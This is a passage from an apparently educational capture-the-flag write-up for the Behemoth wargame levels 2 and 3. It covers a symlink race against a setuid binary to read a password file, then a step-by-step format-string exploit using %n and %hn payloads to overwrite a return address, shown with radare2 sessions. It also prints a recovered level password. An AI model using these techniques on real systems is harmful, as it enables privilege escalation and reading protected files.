|           0x080485d9      e872feffff     call sym.imp.getpid         ; int getpid(void)
|           0x080485de      8944241c       mov dword [local_1ch], eax
|           0x080485e2      8d442424       lea eax, [local_24h]        ; 0x24 ; '$' ; 36
|           0x080485e6      83c006         add eax, 6
|           0x080485e9      89442420       mov dword [local_20h], eax
|           0x080485ed      8b44241c       mov eax, dword [local_1ch]  ; [0x1c:4]=-1 ; 28
|           0x080485f1      89442408       mov dword [local_8h], eax
|           0x080485f5      c74424047087.  mov dword [local_4h], str.touch__d ; [0x8048770:4]=0x63756f74 ; "touch %d"
|           0x080485fd      8d442424       lea eax, [local_24h]        ; 0x24 ; '$' ; 36
|           0x08048601      890424         mov dword [esp], eax
|           0x08048604      e887feffff     call sym.imp.sprintf        ; int sprintf(char *s,
|           0x08048609      8d442438       lea eax, [local_38h]        ; 0x38 ; '8' ; 56
|           0x0804860d      89442404       mov dword [local_4h], eax
|           0x08048611      8b442420       mov eax, dword [local_20h]  ; [0x20:4]=-1 ; 32
|           0x08048615      890424         mov dword [esp], eax
|           0x08048618      e813010000     call sym.lstat              ; void lstat(const char *path, void *buf)
|           0x0804861d      2500f00000     and eax, 0xf000
|           0x08048622      3d00800000     cmp eax, 0x8000
|       ,=< 0x08048627      7430           je 0x8048659
|       |   0x08048629      8b442420       mov eax, dword [local_20h]  ; [0x20:4]=-1 ; 32
|       |   0x0804862d      890424         mov dword [esp], eax
|       |   0x08048630      e80bfeffff     call sym.imp.unlink         ; int unlink(const char *path)
|       |   0x08048635      e8f6fdffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|       |   0x0804863a      89c3           mov ebx, eax
|       |   0x0804863c      e8effdffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|       |   0x08048641      895c2404       mov dword [local_4h], ebx
|       |   0x08048645      890424         mov dword [esp], eax
|       |   0x08048648      e823feffff     call sym.imp.setreuid
|       |   0x0804864d      8d442424       lea eax, [local_24h]        ; 0x24 ; '$' ; 36
|       |   0x08048651      890424         mov dword [esp], eax
|       |   0x08048654      e807feffff     call sym.imp.system         ; int system(const char *string)
|       `-> 0x08048659      c70424d00700.  mov dword [esp], 0x7d0      ; [0x7d0:4]=-1 ; 2000
|           0x08048660      e8abfdffff     call sym.imp.sleep          ; int sleep(int s)
|           0x08048665      8d442424       lea eax, [local_24h]        ; 0x24 ; '$' ; 36
|           0x08048669      c70063617420   mov dword [eax], 0x20746163 ; [0x20746163:4]=-1
|           0x0804866f      c6400400       mov byte [eax + 4], 0
|           0x08048673      c644242820     mov byte [local_28h], 0x20  ; [0x20:1]=255 ; 32
|           0x08048678      e8b3fdffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|           0x0804867d      89c3           mov ebx, eax
|           0x0804867f      e8acfdffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|           0x08048684      895c2404       mov dword [local_4h], ebx
|           0x08048688      890424         mov dword [esp], eax
|           0x0804868b      e8e0fdffff     call sym.imp.setreuid
|           0x08048690      8d442424       lea eax, [local_24h]        ; 0x24 ; '$' ; 36
|           0x08048694      890424         mov dword [esp], eax
|           0x08048697      e8c4fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0804869c      b800000000     mov eax, 0
|           0x080486a1      8b94249c0000.  mov edx, dword [local_9ch]  ; [0x9c:4]=-1 ; 156
|           0x080486a8      653315140000.  xor edx, dword gs:[0x14]
|       ,=< 0x080486af      7405           je 0x80486b6
|       |   0x080486b1      e86afdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-> 0x080486b6      8b5dfc         mov ebx, dword [local_4h_2]
|           0x080486b9      c9             leave
\           0x080486ba      c3             ret
[0xf7fdaa20]> 
```

OK so we can see the pointer to the string "touch %d" occur at 0x080485f5 and the function `int getpid(void)` occurring at 0x080485d9. So it seems the program is indeed creating a file of the program's current PID. We see another call `void lstat(const char *path, void *buf)` not much further down. Looking up this system call, it appears to return status information about a symbolic link...

I think that's a pretty big hint. OK so how about we try running the program in debug mode and set a breakpoint right before lstat is called. We can then use another terminal to delete the file it touched and create a symbolic link with the name of our debugging process and point it to "/etc/behemoth_pass/behemoth3". Let's then see if the program jumps to 0x08048659 or continues after lstat without jumping.

From starting up radare, we see the process is assigned PID 17914. Let's set our breakpoint, hit it, then perform the symbolic link swap before running more.

Debug terminal:
```bash
[0xf7fdaa20]> db 0x08048618
[0xf7fdaa20]> db 0x08048659
[0xf7fdaa20]> db 0x08048629
[0xf7fdaa20]> dc
hit breakpoint at: 8048618
```

Second terminal:
```bash
behemoth2@behemoth:/tmp/smhbehemoth2$ ln -s /etc/behemoth_pass/behemoth3 17835 
behemoth2@behemoth:/tmp/smhbehemoth2$ ls
17835
behemoth2@behemoth:/tmp/smhbehemoth2$ 
```

Original debug terminal:
```bash
hit breakpoint at: 8048629
[0x08048618]> 
```

So it seems we didn't jump. Therefore, we can conclude we will jump if the symbolic link doesn't exist. Since if we don't jump the `unlink` function is called, let's explore the jump route. Immediately we see a `sleep` call with a value pushed to the stack that equals 2000...

2000 seconds of sleep! That's about 30 minutes. It looks like it will call system() once the sleep has finished with setreuid before that. Let's try to do the delete and symbolic link after the lstat and during the sleep call. Once the sleep is done perhaps we will get lucky and it'll display the contents of the link (behemoth3 password). 

Console running executable:
```bash
behemoth2@behemoth:/tmp/smhbehemoth2$ rm * 
behemoth2@behemoth:/tmp/smhbehemoth2$ /behemoth/behemoth2 

```

While behemoth2 is sleeping in another terminal:
```bash
behemoth2@behemoth:/tmp/smhbehemoth2$ ls -l
total 0
-rw-rw-r-- 1 behemoth3 behemoth2 0 Feb 24 03:29 18128
behemoth2@behemoth:/tmp/smhbehemoth2$ rm 18128
behemoth2@behemoth:/tmp/smhbehemoth2$ ln -s /etc/behemoth_pass/behemoth3 18128
```

Now we wait 30 minutes...

( ~30 minutes later ... )
It worked, password for behemoth3: nieteidiel

# Behemoth3
Running the binary behemoth3 asks us to identify ourselves.
```bash
behemoth3@behemoth:~$ cd /behemoth/
behemoth3@behemoth:/behemoth$ ./behemoth3 
Identify yourself: helloworld
Welcome, helloworld

aaaand goodbye again.
behemoth3@behemoth:/behemoth$ ./behemoth3 
Identify yourself: testing
Welcome, testing

aaaand goodbye again.
behemoth3@behemoth:/behemoth$ 
```

Let's analyze the binary.
```
behemoth3@behemoth:/behemoth$ r2 -d ./behemoth3 
Process with PID 18429 started...
= attach 18429 18429
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
 -- To debug a program, you can call r2 with 'dbg://<path-to-program>' or '-d <path..>'
[0xf7fdaa20]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
TODO: esil-vm not initialized
[Cannot determine xref search boundariesr references (aar)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
= attach 18429 18429
18429
[0xf7fdaa20]> pdf @ main
            ;-- main:
/ (fcn) sym.main 96
|   sym.main ();
|           ; var int local_4h @ esp+0x4
|           ; var int local_8h @ esp+0x8
|           ; var int local_18h @ esp+0x18
|              ; DATA XREF from 0x08048397 (entry0)
|           0x0804847d      55             push ebp
|           0x0804847e      89e5           mov ebp, esp
|           0x08048480      83e4f0         and esp, 0xfffffff0
|           0x08048483      81ece0000000   sub esp, 0xe0
|           0x08048489      c70424608504.  mov dword [esp], str.Identify_yourself: ; [0x8048560:4]=0x6e656449 ; "Identify yourself: "
|           0x08048490      e89bfeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048495      a1a0970408     mov eax, dword [obj.stdin]  ; [0x80497a0:4]=0
|           0x0804849a      89442408       mov dword [local_8h], eax
|           0x0804849e      c7442404c800.  mov dword [local_4h], 0xc8  ; [0xc8:4]=-1 ; 200
|           0x080484a6      8d442418       lea eax, [local_18h]        ; 0x18 ; 24
|           0x080484aa      890424         mov dword [esp], eax
|           0x080484ad      e88efeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x080484b2      c70424748504.  mov dword [esp], str.Welcome_ ; [0x8048574:4]=0x636c6557 ; "Welcome, "
|           0x080484b9      e872feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080484be      8d442418       lea eax, [local_18h]        ; 0x18 ; 24
|           0x080484c2      890424         mov dword [esp], eax
|           0x080484c5      e866feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080484ca      c704247e8504.  mov dword [esp], str._naaaand_goodbye_again. ; [0x804857e:4]=0x6161610a ; "\naaaand goodbye again."
|           0x080484d1      e87afeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080484d6      b800000000     mov eax, 0
|           0x080484db      c9             leave
\           0x080484dc      c3             ret
[0xf7fdaa20]> 
```

There issues are less obvious compared to the last few levels. From analyzing the assembly it seems we might be able to make use of a format string exploit.

I could probably write a whole other blog post on format string exploits alone but there's already a ton of good content online that goes into the details of how it works (https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf).

The issue in this executable is that printf after fgets doesn't use a format specifier in the string. For a correct implementation, the string "Welcome, " should be replaced with "Welcome, %s" which would then copy in our input as a string. Instead, we have something similar to `"Welcome, " + input`. If input is equal to "%x%x", we would actually cause the string input into printf to be "Welcome, %x%x". This would then read the first two values off the stack to populate the two "%x"s. This gives us a method to actually read values off of the stack. 

Reading the stack doesn't seem that dangerous but the "%n" specifier can be used to write a value instead of just reading a value like the other specifiers. Therefore, with a specially crafted input string, we could potentially overwrite a jump or return value on the stack to point to some shellcode.

OK let's try to read some stack values.
```bash
behemoth3@behemoth:/behemoth$ python -c 'print "%08x.%08x.%08x.%08x"' | ./behemoth3 
Identify yourself: Welcome, 000000c8.f7fc75a0.ffffd5ec.f7fe2fc9

aaaand goodbye again.
behemoth3@behemoth:/behemoth$ 
```
In case you are wondering why my input looks different, I decided to prefix "08" infront of 'x' which will cause it to print out the hexadecimal value as 8 characters even if the beginning characters are '0's. The decimal I added inbetween just assists with making the output easier to read.

As we see, the input does indeed print the first four words. Next it's useful to determine where on the stack our input string lies. To do this, we can prepend a known characters to the front of our specifiers like so:
```bash
Identify yourself: Welcome, AAAA000000c8.f7fc75a0.ffffd5ec.f7fe2fc9.00000000.41414141.78383025.3830252e.

aaaand goodbye again.
``` 

The known value we use is 'A' which is 0x41 in hexidecimal. We can see that word #6 contains the four A's. 

Next let's determine if there's a jump or return call we could potentially overwrite. Let's attempt to use the main functions return. We can run the program, set a breakpoint at the return call, complete 1 step, then see what the value of EIP is to determine what address the program jumps to. After that, we can find where that value sits on the stack and attempt to overwrite it.

```bash
[0xf7fdaa20]> db 0x080484dc
[0xf7fdaa20]> dc
Identify yourself: hello
Welcome, hello

aaaand goodbye again.
hit breakpoint at: 80484dc
[0x080484dc]> ds
[0xf7e2f637]> 
```

We can see the program is sitting at 0xf7e2f637. Let's restart the program, run to the same breakpoint and print the contents of the stack.

```bash
[0xf7e2f637]> ood
Process with PID 29128 started...
File dbg:///behemoth/behemoth3  reopened in read-write mode
= attach 29128 29128
29128
[0xf7fdaa20]> dc
Identify yourself: hello
Welcome, hello

aaaand goodbye again.
hit breakpoint at: 80484dc
[0x080484dc]> px 500 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd5fc  37f6 e2f7 0100 0000 94d6 ffff 9cd6 ffff  7...............
0xffffd60c  0000 0000 0000 0000 0000 0000 0070 fcf7  .............p..
0xffffd61c  04dc fff7 00d0 fff7 0000 0000 0070 fcf7  .............p..
0xffffd62c  0070 fcf7 0000 0000 d6d3 ab4e c63d ec74  .p.........N.=.t
0xffffd63c  0000 0000 0000 0000 0000 0000 0100 0000  ................
0xffffd64c  8083 0408 0000 0000 f0ef fef7 8098 fef7  ................
0xffffd65c  00d0 fff7 0100 0000 8083 0408 0000 0000  ................
0xffffd66c  a183 0408 7d84 0408 0100 0000 94d6 ffff  ....}...........
0xffffd67c  e084 0408 4085 0408 8098 fef7 8cd6 ffff  ....@...........
0xffffd68c  18d9 fff7 0100 0000 cbd7 ffff 0000 0000  ................
0xffffd69c  dfd7 ffff f3d7 ffff 07d8 ffff 17d8 ffff  ................
0xffffd6ac  39d8 ffff 4cd8 ffff 55d8 ffff 64d8 ffff  9...L...U...d...
0xffffd6bc  ecdd ffff f7dd ffff 10de ffff c8de ffff  ................
0xffffd6cc  d6de ffff e7de ffff efde ffff 04df ffff  ................
0xffffd6dc  16df ffff 28df ffff 5ddf ffff 7ddf ffff  ....(...]...}...
0xffffd6ec  9ddf ffff bfdf ffff d6df ffff 0000 0000  ................
0xffffd6fc  2000 0000 e09b fdf7 2100 0000 0090 fdf7   .......!.......
0xffffd70c  1000 0000 fffb 8b17 0600 0000 0010 0000  ................
0xffffd71c  1100 0000 6400 0000 0300 0000 3480 0408  ....d.......4...
0xffffd72c  0400 0000 2000 0000 0500 0000 0800 0000  .... ...........
0xffffd73c  0700 0000 00a0 fdf7 0800 0000 0000 0000  ................
0xffffd74c  0900 0000 8083 0408 0b00 0000 cb32 0000  .............2..
0xffffd75c  0c00 0000 cb32 0000 0d00 0000 cb32 0000  .....2.......2..
0xffffd76c  0e00 0000 cb32 0000 1700 0000 0000 0000  .....2..........
0xffffd77c  1900 0000 abd7 ffff 1f00 0000 e4df ffff  ................
0xffffd78c  0f00 0000 bbd7 ffff 0000 0000 0000 0000  ................
0xffffd79c  0000 0000 0000 0000 0000 0000 0000 0081  ................
0xffffd7ac  5e7d 9ae9 83d8 14cf 64cd 0d86 23c3 f469  ^}......d...#..i
0xffffd7bc  3638 3600 0000 0000 0000 0000 0000 002f  686............/
0xffffd7cc  6265 6865 6d6f 7468 2f62 6568 656d 6f74  behemoth/behemot
0xffffd7dc  6833 0058 4447 5f53 4553 5349 4f4e 5f49  h3.XDG_SESSION_I
0xffffd7ec  443d 3139                                D=19
[0x080484dc]> 
```
Since we are right before calling `ret`, the address will be the first 4 bytes of the stack (which we can see above in little endian format). We see that the address sits at 0xffffd5fc. Note that the stack address this ret address sits at could change depending on our input passed to the program. We may need to redetermine what this address is as we change our input.

Let's assume for the moment that the return address will stay at address 0xf7e2f637. Since we determined earlier that our input first is found as the sixth word on the stack, we can store an address that we want to modify at that sixth word (or in other words, as the first four bytes as our input string). Then after 5 reads from the stack (%08x.%08x.%08x.%08x.%08x.) the next specifier can be changed to "%n" in order to write to the first four bytes of our input.

Let me attempt to visualize this concept with an example where I print the contents of the stack immediately after passing in our input. 

```bash
behemoth3@behemoth:/behemoth$ r2 -d behemoth3 
Process with PID 29163 started...
= attach 29163 29163
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
 -- Change your fortune types with 'e cfg.fortunes.type = fun,tips,nsfw' in your ~/.radare2rc
[0xf7fdaa20]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
TODO: esil-vm not initialized
[Cannot determine xref search boundariesr references (aar)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
= attach 29163 29163
29163
[0xf7fdaa20]> pdf @ main
            ;-- main:
/ (fcn) sym.main 96
|   sym.main ();
|           ; var int local_4h @ esp+0x4
|           ; var int local_8h @ esp+0x8
|           ; var int local_18h @ esp+0x18
|              ; DATA XREF from 0x08048397 (entry0)
|           0x0804847d      55             push ebp
|           0x0804847e      89e5           mov ebp, esp
|           0x08048480      83e4f0         and esp, 0xfffffff0
|           0x08048483      81ece0000000   sub esp, 0xe0
|           0x08048489      c70424608504.  mov dword [esp], str.Identify_yourself: ; [0x8048560:4]=0x6e656449 ; "Identify yourself: "
|           0x08048490      e89bfeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048495      a1a0970408     mov eax, dword [obj.stdin]  ; [0x80497a0:4]=0
|           0x0804849a      89442408       mov dword [local_8h], eax
|           0x0804849e      c7442404c800.  mov dword [local_4h], 0xc8  ; [0xc8:4]=-1 ; 200
|           0x080484a6      8d442418       lea eax, [local_18h]        ; 0x18 ; 24
|           0x080484aa      890424         mov dword [esp], eax
|           0x080484ad      e88efeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x080484b2      c70424748504.  mov dword [esp], str.Welcome_ ; [0x8048574:4]=0x636c6557 ; "Welcome, "
|           0x080484b9      e872feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080484be      8d442418       lea eax, [local_18h]        ; 0x18 ; 24
|           0x080484c2      890424         mov dword [esp], eax
|           0x080484c5      e866feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080484ca      c704247e8504.  mov dword [esp], str._naaaand_goodbye_again. ; [0x804857e:4]=0x6161610a ; "\naaaand goodbye again."
|           0x080484d1      e87afeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080484d6      b800000000     mov eax, 0
|           0x080484db      c9             leave
\           0x080484dc      c3             ret
[0xf7fdaa20]> db 080484b2
Cannot place a breakpoint on 0x00000000 unmapped memory. See e? dbg.bpinmaps
[0xf7fdaa20]> db 0x080484b2
[0xf7fdaa20]> dc
Identify yourself: %08x.%08x.%08x.%08x.%08x.%08x.%08x
hit breakpoint at: 80484b2
[0x080484b2]> db 0x080484ca
[0x080484b2]> px 200 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd520  38d5 ffff c800 0000 a075 fcf7 bcd5 ffff  8........u......
0xffffd530  c92f fef7 0000 0000 2530 3878 2e25 3038  ./......%08x.%08
0xffffd540  782e 2530 3878 2e25 3038 782e 2530 3878  x.%08x.%08x.%08x
0xffffd550  2e25 3038 782e 2530 3878 0a00 0100 0000  .%08x.%08x......
0xffffd560  0000 0000 0100 0000 18d9 fff7 afd5 ffff  ................
0xffffd570  aed5 ffff 0100 0000 bf00 0000 3369 eaf7  ............3i..
0xffffd580  aed5 ffff acd6 ffff e000 0000 0000 0000  ................
0xffffd590  00d0 fff7 18d9 fff7 b0d5 ffff 6282 0408  ............b...
0xffffd5a0  0000 0000 44d6 ffff 0070 fcf7 87c2 0000  ....D....p......
0xffffd5b0  ffff ffff 2f00 0000 c83d e2f7 a851 fdf7  ..../....=...Q..
0xffffd5c0  0080 0000 0070 fcf7 0000 0000 2af3 e2f7  .....p......*...
0xffffd5d0  0100 0000 0000 0000 3058 e4f7 2b85 0408  ........0X..+...
0xffffd5e0  0100 0000 a4d6 ffff                      ........
[0x080484b2]> dc
Welcome, 000000c8.f7fc75a0.ffffd5bc.f7fe2fc9.00000000.78383025.3830252e
hit breakpoint at: 80484ca
[0x080484b2]> 
```

I started the program in debug mode and set a breakpoint at 0x080484b2 (this is right after the program take in our input). I pass in seven word reads (%08x) and then print the first 200 bytes of the stack. We see our input starting at address 0xffffd538. I continue the program until just after it prints our input (or in this case, prints out 7 words of the stack). We can see that the first word that's printed out starts at address 0xffffd524. We also see the return address is stored on the data at 0xffffd5cc. As I mentioned above, this return address moved its location on the stack because our input length changed.

Let's modify the input to now include the address we want to change followed by a %n for the 6th specifier.

```bash
[0x080484ca]> ood
Process with PID 29397 started...
File dbg:///behemoth/behemoth3  reopened in read-write mode
= attach 29397 29397
29397
[0xf7fdaa20]> dc
Identify yourself: AAAA%08x.%08x.%08x.%08x.%08x.%n
hit breakpoint at: 80484b2
[0x080484b2]> px 200 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd510  28d5 ffff c800 0000 a075 fcf7 acd5 ffff  (........u......
0xffffd520  c92f fef7 0000 0000 4141 4141 2530 3878  ./......AAAA%08x
0xffffd530  2e25 3038 782e 2530 3878 2e25 3038 782e  .%08x.%08x.%08x.
0xffffd540  2530 3878 2e25 6e0a 0054 fdf7 0100 0000  %08x.%n..T......
0xffffd550  0000 0000 0100 0000 18d9 fff7 9fd5 ffff  ................
0xffffd560  9ed5 ffff 0100 0000 bf00 0000 3369 eaf7  ............3i..
0xffffd570  9ed5 ffff 9cd6 ffff e000 0000 0000 0000  ................
0xffffd580  00d0 fff7 18d9 fff7 a0d5 ffff 6282 0408  ............b...
0xffffd590  0000 0000 34d6 ffff 0070 fcf7 87c2 0000  ....4....p......
0xffffd5a0  ffff ffff 2f00 0000 c83d e2f7 a851 fdf7  ..../....=...Q..
0xffffd5b0  0080 0000 0070 fcf7 0000 0000 2af3 e2f7  .....p......*...
0xffffd5c0  0100 0000 0000 0000 3058 e4f7 2b85 0408  ........0X..+...
0xffffd5d0  0100 0000 94d6 ffff                      ........
[0x080484b2]> px 4 @ 0x41414141
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x41414141  ffff ffff                                ....
[0x080484b2]> dc
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41414141 code=1 ret=0
[0xf7e5ae2f]> 
```

We read 5 words from the stack. If we were to replace %n with %08x, we would read out "0x41414141". Instead though, we use the %n specifier which means that the number of bytes printed up to this point should be stored at the value passed. Therefore, this tells the program to write a value of 28 at the address 0x41414141. However, this program doesn't have access to that memory address and therefore causes the program to segfault. If we change our "AAAA" to the address we want to change, we should write 28 to that address. 

Let's use radare's "profile" feature to pass in input that contains our desired address.

I create a temporary directory within /tmp/ and paste the following within a "profile.rr2" file:
```bash
#!/usr/bin/rarun2
program=/behemoth/behemoth3
stdin=/tmp/smhbehemoth3/input.txt
```
This causes radare to read from "/tmp/smhbehemoth3/input.txt" when the program attempts to read from stdin. Make sure to change the file path to your temporary directory and then create input.txt with the input you want to use.

```bash
behemoth3@behemoth:/tmp/smhbehemoth3$ python -c 'print "\xbc\xd5\xff\xff" + "%08x."*5 + "%n"' > input.txt
behemoth3@behemoth:/tmp/smhbehemoth3$ cat input.txt 
����%08x.%08x.%08x.%08x.%08x.%n
behemoth3@behemoth:/tmp/smhbehemoth3$ 
```

Great should be all set now. Let's rerun radare in debug mode and setup a breakpoint right after it reads in our input and after it prints out input.

```
behemoth3@behemoth:/tmp/smhbehemoth3$ r2 -de dbg.profile=profile.rr2 /behemoth/behemoth3 
Process with PID 29548 started...
= attach 29548 29548
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
 -- Most of commands accept '?' as a suffix. Use it to understand how they work :)
[0xf7fdaa20]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
TODO: esil-vm not initialized
[Cannot determine xref search boundariesr references (aar)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
= attach 29548 29548
29548
[0xf7fdaa20]> pdf @ main
            ;-- main:
/ (fcn) sym.main 96
|   sym.main ();
|           ; var int local_4h @ esp+0x4
|           ; var int local_8h @ esp+0x8
|           ; var int local_18h @ esp+0x18
|              ; DATA XREF from 0x08048397 (entry0)
|           0x0804847d      55             push ebp
|           0x0804847e      89e5           mov ebp, esp
|           0x08048480      83e4f0         and esp, 0xfffffff0
|           0x08048483      81ece0000000   sub esp, 0xe0
|           0x08048489      c70424608504.  mov dword [esp], str.Identify_yourself: ; [0x8048560:4]=0x6e656449 ; "Identify yourself: "
|           0x08048490      e89bfeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048495      a1a0970408     mov eax, dword [obj.stdin]  ; [0x80497a0:4]=0
|           0x0804849a      89442408       mov dword [local_8h], eax
|           0x0804849e      c7442404c800.  mov dword [local_4h], 0xc8  ; [0xc8:4]=-1 ; 200
|           0x080484a6      8d442418       lea eax, [local_18h]        ; 0x18 ; 24
|           0x080484aa      890424         mov dword [esp], eax
|           0x080484ad      e88efeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x080484b2      c70424748504.  mov dword [esp], str.Welcome_ ; [0x8048574:4]=0x636c6557 ; "Welcome, "
|           0x080484b9      e872feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080484be      8d442418       lea eax, [local_18h]        ; 0x18 ; 24
|           0x080484c2      890424         mov dword [esp], eax
|           0x080484c5      e866feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080484ca      c704247e8504.  mov dword [esp], str._naaaand_goodbye_again. ; [0x804857e:4]=0x6161610a ; "\naaaand goodbye again."
|           0x080484d1      e87afeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080484d6      b800000000     mov eax, 0
|           0x080484db      c9             leave
\           0x080484dc      c3             ret
[0xf7fdaa20]> db 0x080484b2
[0xf7fdaa20]> db 0x080484ca
[0xf7fdaa20]> dc
hit breakpoint at: 80484b2
[0x080484b2]> px 200 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd510  28d5 ffff c800 0000 a075 fcf7 acd5 ffff  (........u......
0xffffd520  c92f fef7 0000 0000 bcd5 ffff 2530 3878  ./..........%08x
0xffffd530  2e25 3038 782e 2530 3878 2e25 3038 782e  .%08x.%08x.%08x.
0xffffd540  2530 3878 2e25 6e0a 0054 fdf7 0100 0000  %08x.%n..T......
0xffffd550  0000 0000 0100 0000 18d9 fff7 9fd5 ffff  ................
0xffffd560  9ed5 ffff 0100 0000 bf00 0000 3369 eaf7  ............3i..
0xffffd570  9ed5 ffff 9cd6 ffff e000 0000 0000 0000  ................
0xffffd580  00d0 fff7 18d9 fff7 a0d5 ffff 6282 0408  ............b...
0xffffd590  0000 0000 34d6 ffff 0070 fcf7 87c2 0000  ....4....p......
0xffffd5a0  ffff ffff 2f00 0000 c83d e2f7 a851 fdf7  ..../....=...Q..
0xffffd5b0  0080 0000 0070 fcf7 0000 0000 2af3 e2f7  .....p......*...
0xffffd5c0  0100 0000 0000 0000 3058 e4f7 2b85 0408  ........0X..+...
0xffffd5d0  0100 0000 94d6 ffff                      ........
[0x080484b2]> dc
Identify yourself: Welcome, ����000000c8.f7fc75a0.ffffd5ac.f7fe2fc9.00000000.
hit breakpoint at: 80484ca
[0x080484b2]> px 200 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd510  28d5 ffff c800 0000 a075 fcf7 acd5 ffff  (........u......
0xffffd520  c92f fef7 0000 0000 bcd5 ffff 2530 3878  ./..........%08x
0xffffd530  2e25 3038 782e 2530 3878 2e25 3038 782e  .%08x.%08x.%08x.
0xffffd540  2530 3878 2e25 6e0a 0054 fdf7 0100 0000  %08x.%n..T......
0xffffd550  0000 0000 0100 0000 18d9 fff7 9fd5 ffff  ................
0xffffd560  9ed5 ffff 0100 0000 bf00 0000 3369 eaf7  ............3i..
0xffffd570  9ed5 ffff 9cd6 ffff e000 0000 0000 0000  ................
0xffffd580  00d0 fff7 18d9 fff7 a0d5 ffff 6282 0408  ............b...
0xffffd590  0000 0000 34d6 ffff 0070 fcf7 87c2 0000  ....4....p......
0xffffd5a0  ffff ffff 2f00 0000 c83d e2f7 a851 fdf7  ..../....=...Q..
0xffffd5b0  0080 0000 0070 fcf7 0000 0000 3100 0000  .....p......1...
0xffffd5c0  0100 0000 0000 0000 3058 e4f7 2b85 0408  ........0X..+...
0xffffd5d0  0100 0000 94d6 ffff                      ........
[0x080484b2]> 
```

We see that we were able to change the value at address 0xffffd5bc to 31 (the number of bytes in our input up to and including %n). We can manipulate the value written from 31 to our number of choice by changing 1 of our %08x reads to a %u with the number of we want prepended to u. Example %1000u would print a 1000 digit number. Add our number of characters in the input with this to get the value that will be written with %n. Let's try a few numbers to see how this changes the value written to 0xffffd5bc.

```bash
behemoth3@behemoth:/tmp/smhbehemoth3$ python -c 'print "\xbc\xd5\xff\xff" + "%08x."*4 + "%1000u" + "%n"' > input.txt
0xffffd5b0  0080 0000 0070 fcf7 0000 0000 1004 0000  .....p..........

behemoth3@behemoth:/tmp/smhbehemoth3$ python -c 'print "\xbc\xd5\xff\xff" + "%08x."*4 + "%10000u" + "%n"' > input.txt
0xffffd5b0  0080 0000 0070 fcf7 0000 0000 3827 0000  .....p......8'..

behemoth3@behemoth:/tmp/smhbehemoth3$ python -c 'print "\xbc\xd5\xff\xff" + "%08x."*4 + "%117000000u" + "%n"' > input.txt
0xffffd5b0  0080 0000 0070 fcf7 0000 0000 6847 f906  .....p......hG..

behemoth3@behemoth:/tmp/smhbehemoth3$ python -c 'print "\xbc\xd5\xff\xff" + "%08x."*4 + "%170000000u" + "%n"' > input.txt
0xffffd5b0  0080 0000 0070 fcf7 0000 0000 a8fe 210a  .....p........!.

behemoth3@behemoth:/tmp/smhbehemoth3$ python -c 'print "\xbc\xd5\xff\xff" + "%08x."*4 + "%3308374036u" + "%n"' > input.txt
0xffffd5b0  0080 0000 0070 fcf7 0000 0000 2af3 e2f7  .....p......*...
```

On my last try, I determined how many more digits I would have to print in order to get a value of 0xffffd5bc and determined I needed exactly 3308374036 digits. However, we can see the return address didn't change as expected. This is because the %n specify writes a signed value which limits us to a maximum value of 0x7fffffff before we overflow and create a negative number. 

What we need to do instead is write the new return address as two separate shorts (16 bit values). To do so, we need to modify our input slightly. Instead of supplying just 1 address at the start of our input string, we need to supply two -- one that points to the lower 16-bits of the return address, and one that points to the higher 16-bits of the return address.

`python -c 'print "\xbc\xd5\xff\xff" + "\xbe\xd5\xff\xff" + "%08x."*4 + "%10u" + "%hn" + "%hn"' > input.txt`

```bash
behemoth3@behemoth:/tmp/smhbehemoth3$ python -c 'print "\xbc\xd5\xff\xff" + "\xbe\xd5\xff\xff" + "%08x."*4 + "%10u" + "%hn" + "%hn"' > input.txt
behemoth3@behemoth:/tmp/smhbehemoth3$ r2 -de dbg.profile=profile.rr2 /behemoth/behemoth3 
Process with PID 30076 started...
= attach 30076 30076
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
 -- Enable the PAGER with 'e scr.pager=less -R'
[0xf7fdaa20]> db 0x080484ca
